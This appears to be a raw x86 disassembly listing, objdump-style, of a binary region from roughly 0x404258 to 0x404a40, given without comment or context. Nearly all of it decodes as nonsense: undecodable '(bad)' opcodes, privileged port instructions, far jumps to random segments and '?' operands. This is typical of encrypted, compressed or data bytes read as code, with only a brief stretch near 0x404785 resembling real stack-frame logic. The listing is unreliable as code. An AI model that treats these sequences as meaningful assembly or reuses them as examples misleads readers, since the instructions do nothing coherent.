  404258:	leave  
  404259:	je     0x404290
  40425b:	dec    eax
  40425c:	not    BYTE PTR [esi-0x38fb129c]
  404262:	xor    al,0xc
  404264:	fbstp  TBYTE PTR [esi-0x7]
  404267:	push   0xa02807a3
  40426c:	faddp  st(1),st
  40426e:	xor    DWORD PTR [ecx+0x19],esp
  404271:	sub    cl,BYTE PTR [ecx]
  404273:	hlt    
  404274:	sbb    BYTE PTR [edx-0x49],bl
  404277:	mov    eax,0x1b5ee9ee
  40427c:	loope  0x404293
  40427e:	xchg   esi,eax
  40427f:	pusha  
  404280:	pop    esi
  404281:	cmp    DWORD PTR [esi+eiz*4+0x54],ecx
  404285:	xchg   BYTE PTR [ecx-0x4c],dl
  404288:	shr    DWORD PTR [edx],0xed
  40428b:	inc    esp
  40428c:	gs push esp
  40428e:	pop    edi
  40428f:	jg     0x404231
  404291:	daa    
  404292:	jge    0x40426f
  404294:	ds js  0x404241
  404297:	inc    edi
  404298:	das    
  404299:	cmc    
  40429a:	std    
  40429b:	and    ch,BYTE PTR ds:0x9355329a
  4042a1:	test   eax,0xe0b71c97
  4042a6:	or     BYTE PTR [edx*1-0x1a438dfa],0x7d
  4042ae:	stos   DWORD PTR es:[edi],eax
  4042af:	(bad)  
  4042b1:	fstp   st(7)
  4042b3:	ror    BYTE PTR [esi+0x71],cl
  4042b6:	in     eax,0x4c
  4042b8:	and    DWORD PTR [esp+ebx*2+0x43],esi
  4042bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042bd:	stos   DWORD PTR es:[edi],eax
  4042be:	into   
  4042bf:	xor    al,0xc3
  4042c1:	stc    
  4042c2:	sbb    esp,DWORD PTR [eax+0x18ce1259]
  4042c8:	ss sbb eax,0xcc6ea16d
  4042ce:	sbb    eax,0xe1b3cb2b
  4042d3:	mov    DWORD PTR [ecx-0x33315a6],edi
  4042d9:	ror    DWORD PTR [ebp+0x17],0xe
  4042dd:	iret   
  4042de:	sbb    BYTE PTR [eax],al
  4042e0:	sbb    eax,0xd7b507fc
  4042e5:	int3   
  4042e6:	popa   
  4042e7:	pop    ss
  4042e8:	pop    ecx
  4042e9:	lods   al,BYTE PTR ds:[esi]
  4042ea:	dec    edx
  4042eb:	mov    ds:0x86788675,al
  4042f0:	hlt    
  4042f1:	inc    ecx
  4042f2:	jg     0x40430b
  4042f4:	dec    edx
  4042f5:	int    0xb1
  4042f7:	fimul  DWORD PTR [esi-0xe]
  4042fa:	mov    fs,WORD PTR [ebx-0x75a1be8f]
  404300:	xchg   DWORD PTR [esi-0x58],esp
  404303:	dec    ebp
  404304:	test   al,0x73
  404306:	fdivr  QWORD PTR [edx]
  404308:	outs   dx,BYTE PTR ds:[esi]
  404309:	push   edi
  40430a:	and    al,0x2b
  40430c:	xlat   BYTE PTR ds:[ebx]
  40430d:	loope  0x4042d1
  40430f:	cs mov eax,0x97318469
  404315:	es (bad) 
  404317:	das    
  404318:	je     0x404362
  40431a:	cmp    ch,BYTE PTR [ebx+0x6bed5136]
  404320:	push   esp
  404321:	aad    0x75
  404323:	adc    al,0x2c
  404325:	mov    edi,0xe4947e93
  40432a:	adc    dl,dh
  40432c:	pop    ds
  40432d:	mov    al,0xae
  40432f:	adc    BYTE PTR [ecx],0x62
  404332:	xchg   esp,eax
  404333:	mov    dh,0x9a
  404335:	ror    DWORD PTR [ebx+ebp*2+0x31396b9b],cl
  40433c:	sub    dh,BYTE PTR ds:0xfe9336ca
  404342:	ins    BYTE PTR es:[edi],dx
  404343:	jns    0x4043a6
  404345:	in     eax,dx
  404346:	pop    eax
  404347:	xchg   edx,eax
  404348:	js     0x404354
  40434a:	push   0xdaa9c990
  40434f:	add    dh,BYTE PTR [edx-0xba6b055]
  404355:	mov    ebx,0xa1993d77
  40435a:	fbstp  TBYTE PTR [ecx+0xa222674]
  404360:	sub    BYTE PTR [esi],0x67
  404363:	jo     0x4042fb
  404365:	add    ebx,DWORD PTR [ecx]
  404367:	leave  
  404368:	mov    al,0xb7
  40436a:	cmp    al,0x9b
  40436c:	fwait
  40436d:	(bad)  
  40436e:	aaa    
  40436f:	inc    edx
  404370:	sbb    al,0x9a
  404372:	inc    esp
  404373:	lds    edx,FWORD PTR [esi-0x31]
  404376:	mov    ebx,0x1a3e9318
  40437b:	call   0x6f19f25d
  404380:	out    0x41,al
  404382:	push   0x25
  404384:	sub    DWORD PTR [edx-0x8],ebp
  404387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404388:	mov    ah,0x9
  40438a:	xchg   edi,eax
  40438b:	sbb    DWORD PTR [ecx+0x3],esi
  40438e:	(bad)  
  40438f:	es push eax
  404391:	inc    edi
  404392:	sbb    eax,0x8f796100
  404397:	test   al,0xb7
  404399:	xor    edi,esi
  40439b:	mov    BYTE PTR [ebx-0x34f7ad51],ch
  4043a1:	ret    0xbe95
  4043a4:	or     al,0x65
  4043a6:	sub    al,0x43
  4043a8:	xchg   ebx,eax
  4043a9:	sbb    eax,0x7d538d87
  4043ae:	xchg   esi,eax
  4043af:	mov    ah,0xef
  4043b1:	bound  esi,QWORD PTR [esi+edi*8]
  4043b4:	popa   
  4043b5:	dec    edx
  4043b6:	mov    ds:0xba257a6e,al
  4043bb:	mov    eax,0xc0d37eed
  4043c0:	cmp    ebx,DWORD PTR [ebp-0x64ac7c57]
  4043c6:	mov    ch,0xac
  4043c8:	mov    ecx,0x9dc1d44b
  4043cd:	xor    ebx,DWORD PTR [edi+edi*1]
  4043d0:	cmc    
  4043d1:	xchg   esp,eax
  4043d2:	add    DWORD PTR [eax],esi
  4043d4:	std    
  4043d5:	jl     0x4043c7
  4043d7:	mov    ah,0x48
  4043d9:	mov    ah,0x38
  4043db:	inc    ebx
  4043dc:	out    0x40,eax
  4043de:	inc    edi
  4043df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043e0:	enter  0x8699,0x62
  4043e4:	scas   al,BYTE PTR es:[edi]
  4043e5:	loopne 0x404448
  4043e7:	xchg   ebx,eax
  4043e8:	push   es
  4043e9:	jecxz  0x404410
  4043eb:	rcl    DWORD PTR [edi],0xca
  4043ee:	(bad)  
  4043ef:	jne    0x404458
  4043f1:	mov    bh,0xfb
  4043f3:	clc    
  4043f4:	aas    
  4043f5:	push   cs
  4043f6:	push   ebx
  4043f7:	icebp  
  4043f8:	outs   dx,DWORD PTR ds:[esi]
  4043f9:	sbb    al,0x65
  4043fb:	inc    edx
  4043fc:	stc    
  4043fd:	hlt    
  4043fe:	sub    DWORD PTR [eax+0x540be422],0xa67c68aa
  404408:	pushf  
  404409:	fsubr  DWORD PTR [eax+0x5]
  40440c:	ja     0x40442d
  40440e:	xchg   DWORD PTR [esp+ebp*1+0x5f],edi
  404412:	nop
  404413:	adc    eax,0x39558f3c
  404418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404419:	push   ebx
  40441a:	xchg   DWORD PTR [edx+0x7674a49],esi
  404420:	aas    
  404421:	dec    esp
  404422:	mov    ecx,DWORD PTR [edx-0x7e353b4b]
  404428:	(bad)
  40442b:	setp   BYTE PTR [ecx-0x69]
  40442f:	leave  
  404430:	xchg   BYTE PTR [ebp+0x51],cl
  404433:	lods   eax,DWORD PTR ds:[esi]
  404434:	push   ds
  404435:	fstp   TBYTE PTR [eax+0x15]
  404438:	mov    ecx,0xf9e2b896
  40443d:	mov    al,0x85
  40443f:	aad    0x44
  404441:	pop    esi
  404442:	test   edx,0x5dc27464
  404448:	sti    
  404449:	adc    eax,0x7e57e436
  40444e:	je     0x4044a6
  404450:	imul   esp,DWORD PTR [ebx+ebx*4+0x5c],0x76
  404455:	push   es
  404456:	aad    0x52
  404458:	add    DWORD PTR [eax+edi*4+0x18],esp
  40445c:	jg     0x4043f6
  40445e:	imul   ecx,DWORD PTR [esi+0x4f9658fc],0xffffffb8
  404465:	jl     0x404426
  404467:	push   edi
  404468:	adc    al,0x5b
  40446a:	inc    esp
  40446b:	leave  
  40446c:	push   cs
  40446d:	(bad)  
  40446e:	sbb    al,cl
  404470:	and    edx,DWORD PTR [eax+0x143e3d24]
  404476:	and    cl,BYTE PTR [ebp+0x7d]
  404479:	mov    al,0x2
  40447b:	cmp    dh,BYTE PTR [ebx]
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x40450c
  404490:	mov    al,0x71
  404492:	and    eax,0x7e7e185e
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404519
  40449c:	cwde   
  40449d:	sbb    edx,edx
  40449f:	dec    edx
  4044a0:	ss mov bl,0xc7
  4044a3:	dec    ecx
  4044a4:	add    DWORD PTR [edx+0x1e],ecx
  4044a7:	jl     0x404441
  4044a9:	xchg   esp,eax
  4044aa:	enter  0x98d1,0xe8
  4044ae:	push   esp
  4044af:	mov    bh,al
  4044b1:	mov    ch,0x66
  4044b3:	rcl    DWORD PTR [esi+0x2f],cl
  4044b6:	adc    edi,edx
  4044b8:	stos   BYTE PTR es:[edi],al
  4044b9:	data16 mov ch,BYTE PTR [ebx+0x2814bc6b]
  4044c0:	mov    BYTE PTR ds:0x8db1f6be,cl
  4044c6:	mov    dh,0x4f
  4044c8:	rcl    ecx,1
  4044ca:	xor    eax,0x593b3c17
  4044cf:	xchg   DWORD PTR [esi+ebp*1],edi
  4044d2:	dec    edi
  4044d3:	stc    
  4044d4:	mov    dh,0x4e
  4044d6:	nop
  4044d7:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4044d9:	out    dx,al
  4044da:	fisttp DWORD PTR [eax]
  4044dc:	sub    ch,BYTE PTR [eax]
  4044de:	jecxz  0x4044e4
  4044e0:	rol    DWORD PTR [edx],1
  4044e2:	adc    BYTE PTR [ebx-0x77],dl
  4044e5:	jl     0x4044ed
  4044e7:	nop
  4044e8:	mov    eax,ds:0x2277361f
  4044ed:	mov    ds:0x5d095688,al
  4044f2:	jne    0x4044d1
  4044f4:	js     0x4044fb
  4044f6:	and    al,0xdf
  4044f8:	cmp    edi,DWORD PTR [edx]
  4044fa:	aas    
  4044fb:	ret    
  4044fc:	jp     0x404577
  4044fe:	adc    DWORD PTR [edi-0xb],esp
  404501:	shl    DWORD PTR [edi-0x54],cl
  404504:	pop    ecx
  404505:	mov    al,0x7e
  404507:	adc    edx,ebx
  404509:	repnz sub al,0x65
  40450c:	fsubr  QWORD PTR [edx+0x61]
  40450f:	add    BYTE PTR [eax+0x11],al
  404512:	xchg   ecx,eax
  404513:	cmp    BYTE PTR [esi],0x3c
  404516:	test   ch,0xcc
  404519:	pusha  
  40451a:	jbe    0x404575
  40451c:	repnz sub ah,BYTE PTR [edx]
  40451f:	push   ecx
  404520:	jle    0x40454c
  404522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404523:	lock inc edi
  404525:	mov    al,ds:0xec47890b
  40452a:	cmp    bh,bh
  40452c:	jecxz  0x40459d
  40452e:	inc    di
  404530:	push   cs
  404531:	inc    edx
  404532:	ins    BYTE PTR es:[edi],dx
  404533:	shl    DWORD PTR [edi+0x29],cl
  404536:	leave  
  404537:	es js  0x404571
  40453a:	loopne 0x404570
  40453c:	out    0x6f,al
  40453e:	and    DWORD PTR [ecx+0x443d1ef6],0xeb4c6a6f
  404548:	int    0x44
  40454a:	popf   
  40454b:	pop    ds
  40454c:	clc    
  40454d:	stc    
  40454e:	push   0x81dcf3c
  404553:	push   edx
  404554:	pop    esi
  404555:	fbstp  TBYTE PTR [ecx+0x13]
  404558:	pop    es
  404559:	xor    eax,0xe401fd
  40455e:	or     DWORD PTR ds:0xec715a9a,eax
  404564:	sub    BYTE PTR [edx+0x3905316e],bh
  40456a:	push   ss
  40456b:	ins    DWORD PTR es:[edi],dx
  40456c:	test   eax,0xdaf92bc3
  404571:	in     al,0x96
  404573:	sub    eax,0xecd5d8bb
  404578:	iret   
  404579:	sbb    dh,ch
  40457b:	mov    ch,0xf9
  40457d:	inc    edi
  40457e:	dec    ebp
  40457f:	adc    esi,DWORD PTR [eax]
  404581:	inc    esp
  404582:	mov    BYTE PTR [ebx-0x31],0x89
  404586:	mov    eax,0xf9c44d6d
  40458b:	sub    edi,DWORD PTR [edx+0x72453083]
  404591:	mov    esp,0x60599e3c
  404596:	cmp    dl,BYTE PTR ds:0xe73c785b
  40459c:	clc    
  40459d:	jle    0x40459f
  40459f:	jge    0x4045e8
  4045a1:	mov    ah,0x45
  4045a3:	js     0x4045cc
  4045a5:	(bad)  
  4045a6:	mov    edx,0x34a69dff
  4045ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ac:	fwait
  4045ad:	pop    esi
  4045ae:	ja     0x4045c9
  4045b0:	jmp    0x40456b
  4045b2:	mov    ah,0x65
  4045b4:	inc    ecx
  4045b5:	call   FWORD PTR [edx+0x6ce28820]
  4045bb:	push   esi
  4045bc:	sbb    bl,BYTE PTR [edx]
  4045be:	xor    BYTE PTR [ebx+0x2e],dl
  4045c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045c2:	inc    ebx
  4045c3:	jecxz  0x4045a6
  4045c5:	mov    ah,0x43
  4045c7:	or     BYTE PTR ds:0xfc55948c,0xd7
  4045ce:	add    eax,0x3f901181
  4045d3:	fs xchg dx,ax
  4045d6:	mov    esi,0x23cb7325
  4045db:	clc    
  4045dc:	or     dh,BYTE PTR [ebx]
  4045de:	fsubr  QWORD PTR ds:0xcd7911a3
  4045e4:	fbld   TBYTE PTR ds:0xa6d19301
  4045ea:	cmp    DWORD PTR [esi-0x1bbdbdf4],0x54526a79
  4045f4:	ja     0x4045f3
  4045f6:	jnp    0x404583
  4045f8:	mov    ecx,0xd4b68157
  4045fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045fe:	fld    TBYTE PTR [ebp-0x31]
  404601:	jle    0x404604
  404603:	int    0xe5
  404605:	ficomp WORD PTR [esi+0x2b]
  404608:	sub    ah,BYTE PTR [eax]
  40460a:	jo     0x4045f7
  40460c:	mov    ebp,0x6f068967
  404611:	dec    eax
  404612:	and    BYTE PTR [esi+0x2e],dh
  404615:	fsubr  DWORD PTR ds:0xd7e54e29
  40461b:	les    esi,FWORD PTR [esi]
  40461d:	dec    ebx
  40461e:	or     bh,BYTE PTR [edi+0x3]
  404621:	shl    dh,cl
  404623:	out    0xd7,eax
  404625:	(bad)  
  404626:	mov    ah,bh
  404628:	arpl   WORD PTR [edx-0x7f],si
  40462b:	fs ror ah,0xca
  40462f:	mov    cl,0x1
  404631:	cmp    eax,0xd3d3d523
  404636:	cwde   
  404637:	addr16 int 0xe9
  40463a:	add    al,0x15
  40463c:	jno    0x4045f4
  40463e:	test   ebx,0x7028d6d6
  404644:	repz shl BYTE PTR [edi+0x604fa1d5],1
  40464b:	(bad)  
  40464d:	jne    0x404609
  40464f:	fs addr16 push ds
  404652:	es inc eax
  404654:	loopne 0x4046d4
  404656:	inc    esi
  404657:	sub    ebx,ebx
  404659:	popa   
  40465a:	mov    ebx,0xfa003c91
  40465f:	les    ebx,FWORD PTR [edi-0x2]
  404662:	popf   
  404663:	bound  esi,QWORD PTR [edx-0x7e]
  404666:	fild   QWORD PTR [edx-0x23]
  404669:	stos   DWORD PTR es:[edi],eax
  40466a:	cli    
  40466b:	aaa    
  40466c:	adc    al,0x52
  40466e:	out    dx,eax
  40466f:	and    al,0x30
  404671:	xor    esi,ebp
  404673:	ins    DWORD PTR es:[edi],dx
  404674:	(bad)  
  404675:	pop    ss
  404676:	inc    esp
  404677:	push   ebx
  404678:	sbb    edx,DWORD PTR [eax+0x35ca0814]
  40467e:	add    ecx,DWORD PTR [eax]
  404680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404681:	mov    edi,0x66e14cf0
  404686:	or     ebx,DWORD PTR [ebx+edx*8-0x5e316873]
  40468d:	push   ecx
  40468e:	adc    al,BYTE PTR [ecx]
  404690:	ins    DWORD PTR es:[edi],dx
  404691:	mov    al,0xdb
  404693:	mov    al,ah
  404695:	adc    DWORD PTR [ebp-0x60734672],ecx
  40469b:	sbb    BYTE PTR [eax-0x28],bh
  40469e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40469f:	or     al,BYTE PTR [ecx+0x353f85eb]
  4046a5:	das    
  4046a6:	jle    0x40462b
  4046a8:	and    ecx,edx
  4046aa:	bound  esp,QWORD PTR [eax+0x6f]
  4046ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046ae:	ds popf 
  4046b0:	(bad)  
  4046b1:	sbb    BYTE PTR [ecx-0x61ccd22b],ah
  4046b7:	clc    
  4046b8:	push   cs
  4046b9:	aaa    
  4046ba:	pushf  
  4046bb:	sbb    BYTE PTR [edi],bh
  4046bd:	and    eax,ebx
  4046bf:	pop    ss
  4046c0:	(bad)  
  4046c1:	retf   
  4046c2:	cmp    ecx,DWORD PTR [ebx-0x2c36d9c]
  4046c8:	call   0x3dc5:0xc178cc5e
  4046cf:	push   edi
  4046d0:	sbb    edi,DWORD PTR [edi+0x3e]
  4046d3:	rol    BYTE PTR [edi+0x2d],cl
  4046d6:	lea    ebx,[ecx]
  4046d8:	xchg   BYTE PTR [si-0x4269],al
  4046dd:	shl    DWORD PTR [ecx-0x6fce15b0],0xe8
  4046e4:	fcmovnu st,st(4)
  4046e6:	fwait
  4046e7:	popa   
  4046e8:	mov    esp,0x27f8c68a
  4046ed:	cmp    DWORD PTR [eax+eiz*4-0x67],ebp
  4046f1:	push   eax
  4046f2:	adc    BYTE PTR [eax-0x3f303df7],cl
  4046f8:	jg     0x4046f1
  4046fa:	rol    DWORD PTR [eax-0x15],1
  4046fd:	(bad)
  404700:	mov    cl,0x4a
  404702:	mov    bh,0x14
  404704:	adc    DWORD PTR [edi+ecx*4+0x52],esi
  404708:	gs dec esp
  40470a:	and    ch,cl
  40470c:	aam    0xc2
  40470e:	mov    ch,0x8a
  404710:	les    ebx,FWORD PTR [esi]
  404712:	inc    edx
  404713:	stos   DWORD PTR es:[edi],eax
  404714:	xchg   DWORD PTR [ebp*1+0x3b801a11],esi
  40471b:	dec    esp
  40471c:	push   0x7b50bab4
  404721:	mov    esi,0x226b8201
  404726:	popa   
  404727:	inc    esp
  404728:	inc    ebx
  404729:	inc    edx
  40472a:	jb     0x40479d
  40472c:	repnz add BYTE PTR [edi],cl
  40472f:	cli    
  404730:	loop   0x404747
  404732:	cmp    al,0x4b
  404734:	jmp    0x9ddc:0x13fbcd2d
  40473b:	dec    eax
  40473c:	push   dx
  40473e:	mov    esp,0xf160444e
  404743:	inc    ebx
  404744:	sar    BYTE PTR [ebx],0x10
  404747:	pop    eax
  404748:	jle    0x404726
  40474a:	fdivr  st(7),st
  40474c:	mov    ds:0x5fba60b2,al
  404751:	dec    edx
  404752:	mov    ds:0x23b76d50,al
  404757:	adc    esp,DWORD PTR [ecx+eax*8+0x27]
  40475b:	sub    al,ch
  40475d:	leave  
  40475e:	scas   al,BYTE PTR es:[edi]
  40475f:	cmp    eax,0x20fad4b9
  404764:	push   ss
  404765:	out    dx,al
  404766:	pop    ebp
  404767:	test   DWORD PTR cs:[esi-0x3f],esi
  40476b:	dec    ecx
  40476c:	xor    cl,BYTE PTR [eax+0x6]
  40476f:	push   0x62
  404771:	sar    DWORD PTR [ebx-0x80],1
  404774:	mov    BYTE PTR [edi-0xe],ah
  404777:	and    BYTE PTR [esi+edi*1-0x4a],ch
  40477b:	sub    eax,0xbb397c47
  404780:	mov    eax,ds:0xf903d033
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	aaa    
  4047b5:	es dec edx
  4047b7:	push   0x7e7e27b8
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x4047f0
  4047c1:	jb     0x404821
  4047c3:	mov    ds:0x920afed5,eax
  4047c8:	repnz sub cl,BYTE PTR [ecx]
  4047cb:	rcl    cl,0x4
  4047ce:	mov    ds:0x614bd3a9,al
  4047d3:	push   ecx
  4047d4:	add    al,0x75
  4047d6:	test   BYTE PTR [eax-0x6cc0b141],bl
  4047dc:	mov    ecx,esp
  4047de:	retf   0x359a
  4047e1:	jbe    0x404859
  4047e3:	pop    edi
  4047e4:	pop    ebx
  4047e5:	je     0x40478b
  4047e7:	mov    eax,ds:0xacf7d8e7
  4047ec:	test   BYTE PTR [ecx-0x8],cl
  4047ef:	sub    DWORD PTR [edi+0x511b1734],edx
  4047f5:	cmp    eax,0xd2b8c6ed
  4047fa:	idiv   DWORD PTR [eax+0xb]
  4047fd:	in     eax,dx
  4047fe:	lods   al,BYTE PTR ds:[esi]
  4047ff:	scas   al,BYTE PTR es:[edi]
  404800:	fs repnz mov esi,0x151f41b8
  404807:	xor    edx,esp
  404809:	pop    edi
  40480a:	clc    
  40480b:	sbb    BYTE PTR [ecx],bl
  40480d:	aas    
  40480e:	pop    edi
  40480f:	and    DWORD PTR [edi+0x635e04b9],0x6715e91d
  404819:	shr    BYTE PTR [eiz*2+0x377472f2],1
  404820:	and    ebp,esi
  404822:	(bad)  
  404823:	aam    0x81
  404825:	mov    edi,0x4932d92e
  40482a:	sbb    DWORD PTR [esi-0x55b107e1],edi
  404830:	lods   eax,DWORD PTR ds:[esi]
  404831:	daa    
  404832:	pushf  
  404833:	fldcw  WORD PTR [ebx]
  404835:	cmc    
  404836:	push   ebp
  404837:	dec    edi
  404838:	inc    esi
  404839:	jl     0x404802
  40483b:	mov    esi,ecx
  40483d:	or     al,0x81
  40483f:	fmul   DWORD PTR [ebp+0x78a229fd]
  404845:	xchg   DWORD PTR [edx+0x37],edi
  404848:	daa    
  404849:	inc    edx
  40484a:	aad    0x9e
  40484c:	cmp    al,0x95
  40484e:	inc    ecx
  40484f:	test   ebx,esp
  404851:	das    
  404852:	leave  
  404853:	fcom   QWORD PTR [ebp-0x68]
  404856:	xor    al,0x55
  404858:	pop    ds
  404859:	mov    bl,0xf8
  40485b:	jns    0x404894
  40485d:	mov    ?,WORD PTR [ebp-0x1fab374e]
  404863:	in     eax,0x2
  404865:	ss mov bh,0x38
  404868:	pop    ebx
  404869:	loopne 0x40483f
  40486b:	cmp    dh,BYTE PTR [eax-0x77]
  40486e:	loop   0x4048c0
  404870:	or     DWORD PTR [esi],ecx
  404872:	fmul   st(4),st
  404874:	xchg   BYTE PTR [ebx-0x6],bl
  404877:	fwait
  404878:	data16 cmp al,0x48
  40487b:	repnz pop ebp
  40487d:	dec    edi
  40487e:	test   DWORD PTR [edx],ebx
  404880:	mov    BYTE PTR [eax-0x39],ch
  404883:	rcl    BYTE PTR [ebx+0x445f8024],1
  404889:	and    bh,al
  40488b:	pop    ds
  40488c:	addr16 icebp 
  40488e:	xlat   BYTE PTR ds:[ebx]
  40488f:	fcmovbe st,st(0)
  404891:	pause  
  404893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404894:	pop    edx
  404895:	adc    bl,BYTE PTR [ecx+0x47]
  404898:	scas   al,BYTE PTR es:[edi]
  404899:	sub    dl,BYTE PTR [edi-0x59]
  40489c:	pop    esp
  40489d:	dec    edx
  40489e:	test   DWORD PTR ds:0x9608244c,edi
  4048a4:	adc    DWORD PTR [edi+ebp*2-0x70],ecx
  4048a8:	push   0x1eef5347
  4048ad:	mov    ah,0x28
  4048af:	mov    dl,0xb2
  4048b1:	and    DWORD PTR [edx+ebx*8-0x5819e6d],0x1b3ec023
  4048bc:	xor    BYTE PTR [ecx+0x450715a5],al
  4048c2:	nop
  4048c3:	cli    
  4048c4:	ins    DWORD PTR es:[edi],dx
  4048c5:	xchg   BYTE PTR [ebx+0x1bcfe589],dl
  4048cb:	popa   
  4048cc:	outs   dx,BYTE PTR ds:[esi]
  4048cd:	inc    ecx
  4048ce:	rcl    DWORD PTR [ecx-0x1],cl
  4048d1:	mov    al,ds:0x5d793b4f
  4048d6:	sbb    DWORD PTR [esi],0x804da26f
  4048dc:	jmp    0x7083b696
  4048e1:	test   DWORD PTR ds:0x2ee71635,ebx
  4048e7:	adc    al,BYTE PTR [edx-0xaf864a4]
  4048ed:	jl     0x404897
  4048ef:	je     0x4048a7
  4048f1:	mul    BYTE PTR [esi]
  4048f3:	mov    bh,0x42
  4048f5:	pop    es
  4048f6:	rcl    DWORD PTR [edi+0x34edbf54],cl
  4048fc:	mov    esp,0xf6880ea
  404901:	(bad)  
  404902:	icebp  
  404903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404904:	or     BYTE PTR [ecx-0x52778a29],dh
  40490a:	mov    edx,0xbb4f8263
  40490f:	lahf   
  404910:	jecxz  0x4048a6
  404912:	mov    ah,0xf
  404914:	mov    esi,0x1e481c3b
  404919:	fdiv   QWORD PTR [ecx+0x28aaefac]
  40491f:	inc    ebp
  404920:	inc    dl
  404922:	iret   
  404923:	xor    eax,DWORD PTR [eax]
  404925:	ins    DWORD PTR es:[edi],dx
  404926:	xor    al,BYTE PTR [eax]
  404928:	into   
  404929:	imul   esi,ebp,0xf9ecf54f
  40492f:	je     0x4048e8
  404931:	inc    edx
  404932:	imul   ecx,DWORD PTR [ecx-0x6e0379f5],0x5d
  404939:	arpl   ax,bp
  40493b:	pop    edx
  40493c:	mov    eax,cs
  40493e:	pop    esi
  40493f:	jecxz  0x4049a9
  404941:	jo     0x404902
  404943:	stc    
  404944:	push   ds
  404945:	cwde   
  404946:	in     al,0x3e
  404948:	mov    dl,0x1e
  40494a:	fist   WORD PTR [ebx]
  40494c:	ins    BYTE PTR es:[edi],dx
  40494d:	xor    ah,BYTE PTR [edx]
  40494f:	sahf   
  404950:	adc    ebx,ebx
  404952:	add    esp,0xffffffc0
  404955:	add    DWORD PTR [ecx+edx*4+0x1d2f3b00],esi
  40495c:	mov    BYTE PTR [esi-0x4ee5865c],dl
  404962:	mov    ch,0x48
  404964:	lock ret 
  404966:	call   0x3138bbea
  40496b:	mov    al,ds:0x14062d65
  404970:	out    0xb,al
  404972:	adc    DWORD PTR [eax+0x633aa8b1],0xffffffb9
  404979:	cwde   
  40497a:	dec    ebp
  40497b:	jbe    0x40490b
  40497d:	add    al,0x55
  40497f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404980:	xor    BYTE PTR [edi],bl
  404982:	rcr    DWORD PTR [edx],cl
  404984:	inc    edx
  404985:	or     BYTE PTR [ebp+eax*4-0x4813a46f],ah
  40498c:	or     eax,0x7684e75
  404991:	out    dx,al
  404992:	lea    ecx,[ebp+0x4b]
  404995:	push   ss
  404996:	sbb    al,0xa8
  404998:	xor    ebx,DWORD PTR [edx]
  40499a:	or     DWORD PTR [ebx+ecx*1],0x4f
  40499e:	mov    dh,0x87
  4049a0:	imul   edx,edi,0x6be3dd35
  4049a6:	add    dh,BYTE PTR [edx-0x6e]
  4049a9:	sub    eax,0xfc2566d6
  4049ae:	dec    esi
  4049af:	jecxz  0x40496c
  4049b1:	sub    ebp,DWORD PTR [edx-0x34]
  4049b4:	call   0x3342:0xfc3a6b68
  4049bb:	push   ds
  4049bc:	aam    0x16
  4049be:	jo     0x404a29
  4049c0:	inc    edx
  4049c1:	mov    eax,ds:0xff48e403
  4049c6:	jnp    0x404a16
  4049c8:	pusha  
  4049c9:	jo     0x4049b6
  4049cb:	repnz inc esp
  4049cd:	sub    eax,0xc0c31d8e
  4049d2:	loopne 0x404a0a
  4049d4:	shl    BYTE PTR [eax],0x55
  4049d7:	cmp    al,0xa7
  4049d9:	loop   0x404964
  4049db:	sbb    eax,0xad21c960
  4049e0:	mov    esp,0x88104904
  4049e5:	call   FWORD PTR [ecx+eiz*8+0x139c051b]
  4049ec:	(bad)  
  4049ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049ee:	leave  
  4049ef:	ins    DWORD PTR es:[edi],dx
  4049f0:	add    esi,DWORD PTR [edx-0xf]
  4049f3:	sbb    DWORD PTR [ecx],ecx
  4049f5:	jge    0x404a3d
  4049f7:	sub    cl,bh
  4049f9:	sub    DWORD PTR [edi],0xffffff86
  4049fc:	add    BYTE PTR [edx-0x32],0x59
  404a00:	inc    esi
  404a01:	mov    esi,0x74ccc404
  404a07:	je     0x404a1d
  404a09:	(bad)  
  404a0a:	fst    st(6)
  404a0c:	add    cl,BYTE PTR [esp+ebp*8-0x7e0c5376]
  404a13:	dec    ebx
  404a14:	jle    0x4049c4
  404a16:	mov    ch,bl
  404a18:	mov    bh,0x88
  404a1a:	push   ebx
  404a1b:	inc    edx
  404a1c:	pop    esp
  404a1d:	loop   0x404a17
  404a1f:	sub    BYTE PTR fs:[esi-0x7f],cl
  404a23:	and    ebp,DWORD PTR [ecx+0x1e]
  404a26:	dec    ebx
  404a27:	jl     0x404a8c
  404a29:	jl     0x4049db
  404a2b:	inc    ecx
  404a2c:	add    ch,cl
  404a2e:	into   
  404a2f:	xchg   DWORD PTR [esi-0x3710f055],edx
  404a35:	es enter 0xbaa3,0x82
  404a3a:	(bad)  
  404a3b:	(bad)  
  404a3c:	mov    dl,0xdc
  404a3e:	sub    edi,eax
  404a40:	pop    eax
